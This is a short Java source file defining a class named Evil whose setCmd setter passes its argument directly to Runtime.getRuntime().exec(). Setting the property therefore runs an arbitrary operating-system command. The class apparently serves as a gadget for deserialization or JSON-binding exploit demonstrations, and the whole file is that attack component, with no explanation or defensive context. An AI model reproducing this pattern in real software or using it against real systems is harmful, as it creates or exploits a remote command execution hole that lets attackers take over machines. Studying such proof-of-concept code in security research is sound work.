package gaia;

public class Evil {
    String cmd;
    public Evil(){}

    public String getCmd() {
        return cmd;
    }

    public void setCmd(String cmd) {
        try{
            Runtime.getRuntime().exec(cmd);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
